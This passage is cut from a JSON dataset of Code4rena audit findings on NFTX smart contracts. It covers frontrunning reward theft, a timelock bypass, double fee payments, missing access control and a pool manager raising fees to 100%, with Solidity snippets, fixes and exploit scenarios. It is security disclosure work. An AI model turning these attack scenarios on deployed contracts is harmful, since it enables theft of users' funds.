\n\n**[0xKiwi (NFTX) resolved](https://github.com/code-423n4/2021-12-nftx-findings/issues/69)**\n\n**[LSDan (judge) decreased severity to medium and commented](https://github.com/code-423n4/2021-12-nftx-findings/issues/69#issuecomment-1064475286):**\n > This is a medium risk, not high. The attack has external requirements and is relatively easy for the DAO to mitigate.\n\n\n\n***\n\n",
      "summary": "\nThe NFTXSimpleFeeDistributor.sol contract contains a vulnerability that could lead to a denial of service (DOS) attack. In the distribute function, the contract calls the _sendForReceiver function to distribute the fee. In the _sendForReceiver function, if the receiver is a contract, the receiver's receiveRewards function will be called. If the receiver is malicious, it can execute revert() in the receiveRewards function, resulting in a DOS attack. To mitigate this vulnerability, the contract can store the fee sent to the receiver in a state variable, and then the receiver can take it out by calling a function.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "NFTX",
      "source_link": "https://code4rena.com/reports/2021-12-nftx",
      "github_link": "https://github.com/code-423n4/2021-12-nftx-findings/issues/69",
      "tags": [],
      "finders": [
        "cccz"
      ]
    },
    {
      "id": "1231",
      "title": "[M-15] No access control on assignFees() function in NFTXVaultFactoryUpgradeable contract",
      "impact": "MEDIUM",
      "content": "_Submitted by ych18_\n\nIf the Vault owner decides to set factoryMintFee and factoryRandomRedeemFee to zero, any user could call the function NFTXVaultFactoryUpgradeable.assignFees() and hence all the fees are updated.\n\n**[0xKiwi (NFTX) confirmed and commented](https://github.com/code-423n4/2021-12-nftx-findings/issues/50#issuecomment-1003233969):**\n > This function is left over from some upgrades. It will be removed. Thank you.\n\n**[0xKiwi (NFTX) resolved](https://github.com/code-423n4/2021-12-nftx-findings/issues/50)**\n\n\n\n***\n\n",
      "summary": "\nA bug report has been submitted by user ych18. The report states that if the Vault owner sets the factoryMintFee and factoryRandomRedeemFee to zero, any user can call the function NFTXVaultFactoryUpgradeable.assignFees() and the fees will be updated. This means that if a user is able to call this function, they will be able to change the fees for minting and redeeming without permission from the Vault owner. This could lead to unauthorized changes in fees and could cause problems for the Vault owner.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "NFTX",
      "source_link": "https://code4rena.com/reports/2021-12-nftx",
      "github_link": "https://github.com/code-423n4/2021-12-nftx-findings/issues/50",
      "tags": [],
      "finders": [
        "ych18"
      ]
    },
    {
      "id": "1230",
      "title": "[M-14] Return variable can remain unassigned in _sendForReceiver",
      "impact": "MEDIUM",
      "content": "_Submitted by sirhashalot, also found by pauliax_\n\nThe `_sendForReceiver()` function only sets a return function in the \"if\" code block, not the \"else\" case. If the \"else\" case is true, no value is returned. The result of this oversight is that the `_sendForReceiver()` function called from the `distribute()` function could sucessfully enter its `else` block if a receiver has `isContract` set to False and successfully transfer the `amountToSend` value. The `ditribute()` function will then have `leftover > 0` and send `currentTokenBalance` to the treasury. This issue is partially due to [Solidity using implicit returns](https://github.com/ethereum/solidity/issues/2951), so if no bool value is explicitly returned, the default bool value of False will be returned.\n\nThis problem currently occurs for any receiver with `isContract` set to False. The `_addReceiver` function allows for `isContract` to be set to False, so such a condition should not result in tokens being sent to the treasury as though it was an emergency scenario.\n\n#### Proof of Concept\n\nThe `else` block is missing a return value\n<https://github.com/code-423n4/2021-12-nftx/blob/194073f750b7e2c9a886ece34b6382b4f1355f36/nftx-protocol-v2/contracts/solidity/NFTXSimpleFeeDistributor.sol#L167-L169>\n\n#### Tools Used\n\nVS Code \"Solidity Visual Developer\" extension\n\n#### Recommended Mitigation Steps\n\nVerify that functions with a return value do actually return a value in all cases. Adding the line `return true;` can be added to the end of the `else` block as one way to resolve this.\n\nAlternatively, if `isContract` should never be set to False, the code should be designed to prevent a receiver from being added with this value.\n\n**[0xKiwi (NFTX) confirmed and resolved](https://github.com/code-423n4/2021-12-nftx-findings/issues/121#issuecomment-1003228547)**\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about the `_sendForReceiver()` function in the `distribute()` function of the NFTXSimpleFeeDistributor.sol file. The issue is that the `_sendForReceiver()` function only sets a return function in the \"if\" code block, not the \"else\" case. This means that if the \"else\" case is true, no value is returned and the `distribute()` function could sucessfully enter its `else` block if a receiver has `isContract` set to False and successfully transfer the `amountToSend` value. As a result, the `ditribute()` function will then have `leftover > 0` and send `currentTokenBalance` to the treasury. The issue is partially due to Solidity using implicit returns, so if no bool value is explicitly returned, the default bool value of False will be returned.\n\nThe recommended mitigation steps are to verify that functions with a return value do actually return a value in all cases. Adding the line `return true;` can be added to the end of the `else` block as one way to resolve this. Alternatively, if `isContract` should never be set to False, the code should be designed to prevent a receiver from being added with this value. The bug was identified with the VS Code \"Solidity Visual Developer\" extension.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "NFTX",
      "source_link": "https://code4rena.com/reports/2021-12-nftx",
      "github_link": "https://github.com/code-423n4/2021-12-nftx-findings/issues/121",
      "tags": [],
      "finders": [
        "sirhashalot",
        "pauliax"
      ]
    },
    {
      "id": "1229",
      "title": "[M-13] Dishonest Stakers Can Siphon Rewards From xToken Holders Through The deposit Function In NFTXInventoryStaking",
      "impact": "MEDIUM",
      "content": "## Handle\n\nleastwood\n\n\n## Vulnerability details\n\n## Impact\n\n`xTokens` is intended to be a representation of staked vault tokens. As the protocol's vaults accrue fees from users, these fees are intended to be distributed to users in an inconsistent fashion. `NFTXInventoryStaking` is one of the ways users can stake vault tokens. Deposits are timelocked for `2` seconds by default, essentially rendering flash loan attacks redundant. However, it is more than likely that the same user could withdraw their `xToken` deposit in the next block (assuming an average block time of just over 13 seconds).\n\nHence, if a well-funded attacker sees a transaction to distribute rewards to `xToken` holders, they could deposit a large sum of vault tokens and receive a majority share of the rewards before withdrawing their tokens in the following block. Additionally, the attacker can force distribute rewards in `NFTXSimpleFeeDistributor` as there is no access control on the `distribute` function.\n\nThis issue allows users to siphon user's rewards from the protocol, intended to be distributed to honest vault token stakers.\n\n## Proof of Concept\n\nConsider the following exploit scenario:\n\n- Currently there are 1000 `shares` and 1000 `base tokens` in the `XTokenUpgradeable` contract.\n- Honest actor, Alice, calls `distribute` in `NFTXSimpleFeeDistributor` which attempts to send 200 `base tokens` as rewards for `xToken` holders accrued via protocol usage.\n- Bob sees a transaction to reward `xToken` holders and frontruns this transaction by staking vault tokens, minting 1000 `shares` and 1000 `base tokens`.\n- Rewards are distributed such that `XTokenUpgradeable` has 2000 `shares` and 2200 `base tokens`.\n- Bob unstakes his tokens and exits the pool, redeeming his 1000 `shares` for 1100 `base tokens`.\n- As a result, Bob was able to siphon off 100 `base tokens` without having to stake their tokens for the same time period that Alice had staked her tokens for.\n- This unfair distribution can be abused again and again to essentially reward dishonest actors over honest staking participants such as Alice.\n\n## Tools Used\n\nManual code review.\nDiscussions with Kiwi.\n\n## Recommended Mitigation Steps\n\nConsider adding a delay to users token deposits into the `XTokenUpgradeable` such that miners cannot feasibly censor a transaction for the specified time interval and users cannot frontrun a transaction to distribute rewards. The interval should be chosen such that enough time is provided for the transaction to be included in a block, given poor network conditions. \n\nI.e. If the chosen interval is 20 blocks. Miners must be able to censor the rewards distribution for 20 blocks. This is unlikely as there would need to be sufficient miner collusion for value to be extracted from the protocol. Additionally, an interval of 20 blocks means that stakers who attempt to enter the pool upon seeing the transaction in the mempool won't be rewarded for such behaviour.\n\nIt is also essential that the `distribute` function in `NFTXSimpleFeeDistributor` is restricted to a given role, ensuring malicious users cannot control at what point rewards are distributed.\n\nAlternatively, PoolTogether has a Time-Weighted-Average-Balance (TWAB) implementation which can be used as [reference](https://v4.docs.pooltogether.com/protocol/concepts/time-weight-average-balance/). This would ensure the fairest distribution of rewards to stakers, however, there are additional gas costs associated with this implementation. Hence, unless the protocol intends to be used primarily on L2 protocols, this solution should be avoided.",
      "summary": "\nThis bug report is about a vulnerability in the `xTokens` protocol which allows users to siphon rewards from the protocol intended to be distributed to honest vault token stakers. This is possible due to the lack of access control on the `distribute` function in `NFTXSimpleFeeDistributor` and the ability to deposit tokens into the `XTokenUpgradeable` contract with no delay. A proof of concept was provided to demonstrate how an attacker could frontrun a transaction and receive a majority of the rewards before withdrawing their tokens in the next block. \n\nTo mitigate this issue, a delay should be added to users token deposits such that miners are unable to censor a transaction for a specified amount of time and users cannot frontrun a transaction. Additionally, the `distribute` function in `NFTXSimpleFeeDistributor` should be restricted to a given role to prevent malicious users from controlling when rewards are distributed. As an alternative, PoolTogether has a Time-Weighted-Average-Balance (TWAB) implementation which can be used as reference, however, there are additional gas costs associated with this implementation.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "NFTX",
      "source_link": "https://code4rena.com/reports/2021-12-nftx",
      "github_link": "https://github.com/code-423n4/2021-12-nftx-findings/issues/57",
      "tags": [],
      "finders": [
        "leastwood"
      ]
    },
    {
      "id": "1228",
      "title": "[M-12] buyAndSwap1155WETH Does Not Work As Intended",
      "impact": "MEDIUM",
      "content": "## Handle\n\nleastwood\n\n\n## Vulnerability details\n\n## Impact\n\nThe `buyAndSwap1155WETH` function in `NFTXMarketplaceZap` aims to facilitate buying and swapping `ERC1155` tokens within a single transaction. The function expects to transfer `WETH` tokens from the `msg.sender` account and use these tokens in purchasing vault tokens. However, the `_buyVaultToken` call in `buyAndSwap1155WETH` actually uses `msg.value` and not `maxWethIn`. As a result, the function will not work unless the user supplies both `WETH` and native `ETH` amounts, equivalent to the `maxWethIn` amount.\n\n## Proof of Concept\n\nhttps://github.com/code-423n4/2021-12-nftx/blob/main/nftx-protocol-v2/contracts/solidity/NFTXMarketplaceZap.sol#L284-L314\n```\nfunction buyAndSwap1155WETH(\n  uint256 vaultId, \n  uint256[] memory idsIn, \n  uint256[] memory amounts, \n  uint256[] memory specificIds, \n  uint256 maxWethIn, \n  address[] calldata path,\n  address to\n) public payable nonReentrant {\n  require(to != address(0));\n  require(idsIn.length != 0);\n  IERC20Upgradeable(address(WETH)).transferFrom(msg.sender, address(this), maxWethIn);\n  uint256 count;\n  for (uint256 i = 0; i < idsIn.length; i++) {\n      uint256 amount = amounts[i];\n      require(amount > 0, \"Transferring < 1\");\n      count += amount;\n  }\n  INFTXVault vault = INFTXVault(nftxFactory.vault(vaultId));\n  uint256 redeemFees = (vault.targetSwapFee() * specificIds.length) + (\n      vault.randomSwapFee() * (count - specificIds.length)\n  );\n  uint256[] memory swapAmounts = _buyVaultToken(address(vault), redeemFees, msg.value, path);\n  _swap1155(vaultId, idsIn, amounts, specificIds, to);\n\n  emit Swap(count, swapAmounts[0], to);\n\n  // Return extras.\n  uint256 remaining = WETH.balanceOf(address(this));\n  WETH.transfer(to, remaining);\n}\n```\n\n## Tools Used\n\nManual code review.\nDiscussions with Kiwi.\n\n## Recommended Mitigation Steps\n\nConsider updating the `buyAndSwap1155WETH` function such that the following line of code is used instead of [this](https://github.com/code-423n4/2021-12-nftx/blob/main/nftx-protocol-v2/contracts/solidity/NFTXMarketplaceZap.sol#L306).\n\n```\nuint256[] memory swapAmounts = _buyVaultToken(address(vault), redeemFees, maxWethIn, path);\n```",
      "summary": "\nA vulnerability was identified in the `buyAndSwap1155WETH` function in `NFTXMarketplaceZap`, a smart contract used to facilitate buying and swapping `ERC1155` tokens. The function expects to transfer `WETH` tokens from the `msg.sender` account and use these tokens in purchasing vault tokens, but instead uses `msg.value` and not `maxWethIn`. This means the function will not work unless the user supplies both `WETH` and native `ETH` amounts, equivalent to the `maxWethIn` amount.\n\nThe vulnerability was identified through manual code review and discussions with Kiwi. To mitigate this issue, consider updating the `buyAndSwap1155WETH` function such that the `_buyVaultToken` call uses `maxWethIn` instead of `msg.value`.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "NFTX",
      "source_link": "https://code4rena.com/reports/2021-12-nftx",
      "github_link": "https://github.com/code-423n4/2021-12-nftx-findings/issues/45",
      "tags": [],
      "finders": [
        "leastwood"
      ]
    },
    {
      "id": "1227",
      "title": "[M-11] NFTXVaultFactoryUpgradeable implementation can be replaced in production breaking the system",
      "impact": "MEDIUM",
      "content": "_Submitted by hyh_\n\n`NFTXVaultFactory` contract holds information regarding vaults, assets and permissions (vaults, \\_vaultsForAsset and excludedFromFees mappings).\nAs there is no mechanics present that transfers this information to another implementation, the switch of nftxVaultFactory to another address performed while in production will break the system.\n\n#### Proof of Concept\n\n`setNFTXVaultFactory` function allows an owner to reset `nftxVaultFactory` without restrictions in the following contracts:\n\nNFTXLPStaking\n<https://github.com/code-423n4/2021-12-nftx/blob/main/nftx-protocol-v2/contracts/solidity/NFTXLPStaking.sol#L59>\n\nNFTXInventoryStaking\n<https://github.com/code-423n4/2021-12-nftx/blob/main/nftx-protocol-v2/contracts/solidity/NFTXInventoryStaking.sol#L51>\n\nNFTXSimpleFeeDistributor\n<https://github.com/code-423n4/2021-12-nftx/blob/main/nftx-protocol-v2/contracts/solidity/NFTXSimpleFeeDistributor.sol#L135>\n\n#### Recommended Mitigation Steps\n\nEither restrict the ability to change the factory implementation to pre-production stages or make `nftxVaultFactory` immutable by allowing changing it only once:\n\nNow:\n```solidity\nfunction setNFTXVaultFactory(address newFactory) external virtual override onlyOwner {\n  require(newFactory != address(0));\n  nftxVaultFactory = INFTXVaultFactory(newFactory);\n}\n```\n\nTo be:\n```solidity\nfunction setNFTXVaultFactory(address newFactory) external virtual override onlyOwner {\n  require(nftxVaultFactory == address(0), \"nftxVaultFactory is immutable\");\n  nftxVaultFactory = INFTXVaultFactory(newFactory);\n}\n```\n\nIf the implementation upgrades in production is desired, the factory data migration logic should be implemented and then used atomically together with the implementation switch in all affected contracts.\n\n**[0xKiwi (NFTX) confirmed and commented](https://github.com/code-423n4/2021-12-nftx-findings/issues/177#issuecomment-1003213811):**\n > This is not a contract that is designed to be replaced, but upgraded. But it is a valid concern that these assistant contracts can have their factory be changed and rendered broken. (even if it were permissioned)<br>\n> Confirming.\n\n**[0xKiwi (NFTX) resolved](https://github.com/code-423n4/2021-12-nftx-findings/issues/177)**\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about the `NFTXVaultFactory` contract which holds information regarding vaults, assets and permissions. The report states that if the switch of nftxVaultFactory to another address is performed while in production, it will break the system. The report also provides the proof of concept by showing the `setNFTXVaultFactory` function which allows an owner to reset `nftxVaultFactory` without restrictions in the following contracts. There are two recommended mitigation steps to prevent this bug from occurring. The first is to restrict the ability to change the factory implementation to pre-production stages. The second is to make `nftxVaultFactory` immutable by allowing changing it only once. If the implementation upgrades in production is desired, the factory data migration logic should be implemented and then used atomically together with the implementation switch in all affected contracts.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "NFTX",
      "source_link": "https://code4rena.com/reports/2021-12-nftx",
      "github_link": "https://github.com/code-423n4/2021-12-nftx-findings/issues/177",
      "tags": [],
      "finders": [
        "hyh"
      ]
    },
    {
      "id": "1226",
      "title": "[M-10] NFTXSimpleFeeDistributor._sendForReceiver doesnâ€™t return success if receiver is not a contract",
      "impact": "MEDIUM",
      "content": "## Handle\n\nhyh\n\n\n## Vulnerability details\n\n## Impact\n\nDouble spending of fees being distributed will happen in favor of the first fee receivers in the `feeReceivers` list at the expense of the last ones.\nAs `_sendForReceiver` doesn't return success for completed transfer when receiver isn't a contract, the corresponding fee amount is sent out twice, to the current and to the next fee receiver in the list. This will lead to double payments for those receivers who happen to be next in the line right after EOAs, and missed payments for the receivers positioned closer to the end of the list as the funds available are going to be already depleted when their turn comes.\n\n## Proof of Concept\n\n`distribute` use `_sendForReceiver` to transfer current vault balance across `feeReceivers`:\nhttps://github.com/code-423n4/2021-12-nftx/blob/main/nftx-protocol-v2/contracts/solidity/NFTXSimpleFeeDistributor.sol#L67\n\n`_sendForReceiver` returns a boolean that is used to move current distribution amount to the next receiver when last transfer failed.\nWhen `_receiver.isContract` is `false` nothing is returned, while `safeTransfer` is done:\nhttps://github.com/code-423n4/2021-12-nftx/blob/main/nftx-protocol-v2/contracts/solidity/NFTXSimpleFeeDistributor.sol#L168\n\nThis way `_sendForReceiver` will indicate that transfer is failed and leftover amount to be added to the next transfer, i.e. the `amountToSend` will be spent twice:\nhttps://github.com/code-423n4/2021-12-nftx/blob/main/nftx-protocol-v2/contracts/solidity/NFTXSimpleFeeDistributor.sol#L64\n\n## Recommended Mitigation Steps\n\nNow:\n```\nfunction _sendForReceiver(FeeReceiver memory _receiver, uint256 _vaultId, address _vault, uint256 amountToSend) internal virtual returns (bool) {\n\tif (_receiver.isContract) {\n\t...\n\t} else {\n\t\tIERC20Upgradeable(_vault).safeTransfer(_receiver.receiver, amountToSend);\n\t}\n}\n```\n\nTo be:\n```\nfunction _sendForReceiver(FeeReceiver memory _receiver, uint256 _vaultId, address _vault, uint256 amountToSend) internal virtual returns (bool) {\n\tif (_receiver.isContract) {\n\t...\n\t} else {\n\t\tIERC20Upgradeable(_vault).safeTransfer(_receiver.receiver, amountToSend);\n\t\treturn true;\n\t}\n}\n```",
      "summary": "\nA bug has been reported in the NFTXSimpleFeeDistributor.sol contract code. The bug can cause double spending of fees that are distributed, in favor of the first fee receivers in the feeReceivers list at the expense of the last ones. This happens because the _sendForReceiver function does not return success for completed transfer when the receiver is not a contract. As a result, the corresponding fee amount is sent out twice, to the current and to the next fee receiver in the list. This will lead to double payments for those receivers who happen to be next in the line right after EOAs, and missed payments for the receivers positioned closer to the end of the list as the funds available are going to be already depleted when their turn comes.\n\nThe recommended mitigation step is to update the _sendForReceiver function to return true when the receiver is not a contract, as this will indicate that the transfer is complete.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "NFTX",
      "source_link": "https://code4rena.com/reports/2021-12-nftx",
      "github_link": "https://github.com/code-423n4/2021-12-nftx-findings/issues/105",
      "tags": [],
      "finders": [
        "hyh"
      ]
    },
    {
      "id": "1225",
      "title": "[M-09] Bypass zap timelock",
      "impact": "MEDIUM",
      "content": "_Submitted by gzeon_\n\nThe default value of `inventoryLockTime` in `NFTXStakingZap` is `7 days` while `DEFAULT_LOCKTIME` in `NFTXInventoryStaking` is 2 ms. These timelock value are used in `NFTXInventoryStaking` to eventually call `_timelockMint` in `XTokenUpgradeable`.\n\n<https://github.com/code-423n4/2021-12-nftx/blob/194073f750b7e2c9a886ece34b6382b4f1355f36/nftx-protocol-v2/contracts/solidity/token/XTokenUpgradeable.sol#L74>\n\n```solidity\nfunction _timelockMint(address account, uint256 amount, uint256 timelockLength) internal virtual {\n  uint256 timelockFinish = block.timestamp + timelockLength;\n  timelock[account] = timelockFinish;\n  emit Timelocked(account, timelockFinish);\n  _mint(account, amount);\n}\n```\n\nThe applicable timelock is calculated by `block.timestamp + timelockLength`, even when the existing timelock is further in the future. Therefore, one can reduce their long (e.g. 7 days) timelock to 2 ms calling `deposit` in `NFTXInventoryStaking`\n\n#### Proof of Concept\n\n<https://github.com/code-423n4/2021-12-nftx/blob/194073f750b7e2c9a886ece34b6382b4f1355f36/nftx-protocol-v2/contracts/solidity/NFTXStakingZap.sol#L160>\n<https://github.com/code-423n4/2021-12-nftx/blob/194073f750b7e2c9a886ece34b6382b4f1355f36/nftx-protocol-v2/contracts/solidity/NFTXInventoryStaking.sol#L30>\n\n#### Recommended Mitigation Steps\n\n```solidity\nfunction _timelockMint(address account, uint256 amount, uint256 timelockLength) internal virtual {\n  uint256 timelockFinish = block.timestamp + timelockLength;\n  if(timelockFinish > timelock[account]){\n    timelock[account] = timelockFinish;\n    emit Timelocked(account, timelockFinish);\n  }\n  _mint(account, amount);\n}\n```\n\n**[0xKiwi (NFTX) disputed](https://github.com/code-423n4/2021-12-nftx-findings/issues/178)**\n\n**[0xKiwi (NFTX) confirmed and commented](https://github.com/code-423n4/2021-12-nftx-findings/issues/178#issuecomment-1007082108):**\n > After taking another look, this is definitely accurate. Thank you!\n\n**[0xKiwi (NFTX) resolved](https://github.com/code-423n4/2021-12-nftx-findings/issues/178)**\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about a vulnerability in the NFTX protocol, which is used to upgrade tokens. The vulnerability is that the default value of `inventoryLockTime` in `NFTXStakingZap` is `7 days` while `DEFAULT_LOCKTIME` in `NFTXInventoryStaking` is 2 ms. This means that one can reduce their long (e.g. 7 days) timelock to 2 ms by calling `deposit` in `NFTXInventoryStaking`. The applicable timelock is calculated by `block.timestamp + timelockLength`, even when the existing timelock is further in the future. \n\nThe recommended mitigation step is to modify the `_timelockMint` function, so that the timelock is only updated if the new timelock is further in the future. This can be done with the following code: \n```\n    function _timelockMint(address account, uint256 amount, uint256 timelockLength) internal virtual {\n        uint256 timelockFinish = block.timestamp + timelockLength;\n        if(timelockFinish > timelock[account]){\n            timelock[account] = timelockFinish;\n            emit Timelocked(account, timelockFinish);\n        }\n        _mint(account, amount);\n    }\n```\nThis bug report was submitted by gzeon.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "NFTX",
      "source_link": "https://code4rena.com/reports/2021-12-nftx",
      "github_link": "https://github.com/code-423n4/2021-12-nftx-findings/issues/178",
      "tags": [],
      "finders": [
        "gzeon"
      ]
    },
    {
      "id": "1224",
      "title": "[M-08] Low-level call return value not checked",
      "impact": "MEDIUM",
      "content": "_Submitted by cmichel_\n\nThe `NFTXStakingZap.addLiquidity721ETHTo` function performs a low-level `.call` in `payable(to).call{value: msg.value-amountEth}` but does not check the return value if the call succeeded.\n\n#### Impact\n\nIf the call fails, the refunds did not succeed and the caller will lose all refunds of `msg.value - amountEth`.\n\n#### Recommended Mitigation Steps\n\nRevert the entire transaction if the refund call fails by checking that the `success` return value of the `payable(to).call(...)` returns `true`.\n\n**[0xKiwi (NFTX) confirmed and commented](https://github.com/code-423n4/2021-12-nftx-findings/issues/140#issuecomment-1003224022):**\n > Nice catch, thank you. Confirmed.\n\n**[0xKiwi (NFTX) resolved](https://github.com/code-423n4/2021-12-nftx-findings/issues/140)**\n\n\n\n***\n\n",
      "summary": "\nA bug has been found in the `NFTXStakingZap.addLiquidity721ETHTo` function, which performs a low-level `.call` in `payable(to).call{value: msg.value-amountEth}` but does not check the return value if the call succeeds. This means that if the call fails, the refunds will not succeed and the caller will lose all refunds of `msg.value - amountEth`. To mitigate this issue, it is recommended to revert the entire transaction if the refund call fails by checking that the `success` return value of the `payable(to).call(...)` returns `true`.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "NFTX",
      "source_link": "https://code4rena.com/reports/2021-12-nftx",
      "github_link": "https://github.com/code-423n4/2021-12-nftx-findings/issues/140",
      "tags": [],
      "finders": [
        "cmichel"
      ]
    },
    {
      "id": "1223",
      "title": "[M-07] Rewards can be stolen",
      "impact": "MEDIUM",
      "content": "_Submitted by cmichel_\n\nThe `NFTXInventoryStaking` contract distributes new rewards to all previous stakers when the owner calls the `receiveRewards` function.\nThis allows an attacker to frontrun this `receiveRewards` transaction when they see it in the mem pool with a `deposit` function.\nThe attacker will receive the rewards pro-rata to their deposits.\nThe deposit will be locked for 2 seconds only (`DEFAULT_LOCKTIME`) after which the depositor can withdraw their initial deposit & the rewards again for a profit.\n\nThe rewards can be gamed this way and one does not actually have to *stake*, only be in the staking contract at the time of reward distribution for 2 seconds.\nThe rest of the time they can be used for other purposes.\n\n#### Recommended Mitigation Steps\n\nDistribute the rewards equally over time to the stakers instead of in a single chunk on each `receiveRewards` call.\nThis is more of a \"streaming rewards\" approach.\n\n**[0xKiwi (NFTX) confirmed and commented](https://github.com/code-423n4/2021-12-nftx-findings/issues/136#issuecomment-1003225759):**\n > Thanks for the report. \n> \n> This is unfortunately unavoidable but streaming isn't a bad idea. Will consider. Thank you.\n> \n> Confirming.\n\n\n\n***\n\n",
      "summary": "\nThis bug report describes a vulnerability in the `NFTXInventoryStaking` contract, which allows an attacker to frontrun the `receiveRewards` transaction when it is in the mem pool. The attacker can then deposit into the contract and receive the rewards pro-rata to their deposits, before withdrawing their initial deposit and the rewards for a profit. The bug report recommends mitigating this vulnerability by distributing rewards equally over time to the stakers, instead of in a single chunk on each `receiveRewards` call.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "NFTX",
      "source_link": "https://code4rena.com/reports/2021-12-nftx",
      "github_link": "https://github.com/code-423n4/2021-12-nftx-findings/issues/136",
      "tags": [],
      "finders": [
        "cmichel"
      ]
    },
    {
      "id": "1222",
      "title": "[M-06] xToken Approvals Allow Spenders To Spend More Tokens",
      "impact": "MEDIUM",
      "content": "## Handle\n\nleastwood\n\n\n## Vulnerability details\n\n## Impact\n\nThe `approve` function has not been overridden and therefore uses `xToken` shares instead of the equivalent rebalanced amount, i.e. the underlying vault token amount.\n\n## Proof of Concept\n\nThe approved spender may spend more tokens than desired. In fact, the approved amount that can be transferred keeps growing as rewards continue to be distributed to the `XTokenUpgradeable` contract.\n\nMany contracts also use the same amount for the `approve` call as for the amount they want to have transferred in a subsequent `transferFrom` call, and in this case, they approve an amount that is too large (as the approved `shares` amount yields a higher rebalanced amount).\n\n## Tools Used\n\nManual code review.\n\n## Recommended Mitigation Steps\n\nThe `_allowances` field should track the rebalanced amounts (i.e. the equivalent vault token amount) such that the approval value does not grow.\n\nThe `transferFrom` needs to be overridden and approvals should then be subtracted by the transferred vault token `amount`, not `shares`.",
      "summary": "\nThis bug report is about a vulnerability in the `approve` function of a contract, which has not been overridden. This vulnerability allows the approved spender to spend more tokens than desired, as the approved amount keeps growing as rewards are distributed to the `XTokenUpgradeable` contract. A manual code review was conducted to identify the vulnerability, and a solution is proposed, which is to track the rebalanced amounts (i.e. the equivalent vault token amount) in the `_allowances` field, and override the `transferFrom` function to subtract the transferred vault token `amount` instead of `shares`.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "NFTX",
      "source_link": "https://code4rena.com/reports/2021-12-nftx",
      "github_link": "https://github.com/code-423n4/2021-12-nftx-findings/issues/58",
      "tags": [],
      "finders": [
        "leastwood"
      ]
    },
    {
      "id": "1221",
      "title": "[M-05] Pool Manager can frontrun fees to 100% and use it to steal the value from users",
      "impact": "MEDIUM",
      "content": "_Submitted by pedroais_\n\nPool Manager can front-run entry fee to 100% and users could lose all their deposits.\n\n#### Proof of Concept\n\nConsidering:<br>\nThe pool manager is the creator of the pool.<br>\nAnyone can create a pool.<br>\nManager is not a trusted actor.\n\nAnyone can create a pool and get people to join. If there is a big deposit admin could front-run the transaction and set the fee to max which is uint(1 ether) = 10\\*\\*18 (100% as this is a per token fee).\n\nFunction that set fees :\n<https://github.com/code-423n4/2021-12-nftx/blob/194073f750b7e2c9a886ece34b6382b4f1355f36/nftx-protocol-v2/contracts/solidity/NFTXVaultUpgradeable.sol#L119>\nMax fees are 1 ether :\n<https://github.com/code-423n4/2021-12-nftx/blob/194073f750b7e2c9a886ece34b6382b4f1355f36/nftx-protocol-v2/contracts/solidity/NFTXVaultFactoryUpgradeable.sol#L122>\n\nThe manager could benefit from this by having other pool assets deposited in staking so he would receive fees in Vtokens and could use them to withdraw the nfts.\n\n#### Recommended Mitigation Steps\n\nAdd a timelock to change fees. In that way, frontrunning wouldn't be possible and users would know the fees they are agreeing with.\n\n**[0xKiwi (NFTX) acknowledged, but disagreed with high severity and commented](https://github.com/code-423n4/2021-12-nftx-findings/issues/213#issuecomment-1003195823):**\n > Most users aren't on vaults that aren't finalized. We warn users for any vaults that arent finalized and we don't present them on our website. Acknowledging and disagreeing with severity.\n\n**[LSDan (judge) decreased severity to medium and commented](https://github.com/code-423n4/2021-12-nftx-findings/issues/213#issuecomment-1064508794):**\n > In my view, this is a medium risk. While user funds are at direct risk, the likelihood of this happening or being worth the effort is low. As the sponsor states, it's very rare for a user to interact with an un-finalized vault. The user would have to be directly linked to the vault and then ignore the giant warning presented front and center in the UI. If that warning were to be removed, however, the risk would increase. This external requirement is the only reason I'm going with medium and not low. \n\n\n\n***\n\n",
      "summary": "\nThis bug report details a vulnerability in the NFTXVaultUpgradeable and NFTXVaultFactoryUpgradeable contracts that could allow a pool manager to front-run entry fees to 100%. This could result in users losing all their deposits. The bug is caused by the fact that anyone can create a pool, and the manager is not a trusted actor. The function that sets fees has a maximum of 1 ether, and the manager could benefit from this by having other pool assets deposited in staking. The recommended mitigation step is to add a timelock to change fees, which would prevent frontrunning and allow users to know the fees they are agreeing with.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "NFTX",
      "source_link": "https://code4rena.com/reports/2021-12-nftx",
      "github_link": "https://github.com/code-423n4/2021-12-nftx-findings/issues/213",
      "tags": [
        "Front-Running"
      ],
      "finders": [
        "pedroais"
      ]
    },
    {
      "id": "1220",
      "title": "[M-04] NFTXStakingZap and NFTXMarketplaceZapâ€™s transferFromERC721 transfer Cryptokitties to the wrong address",
      "impact": "MEDIUM",
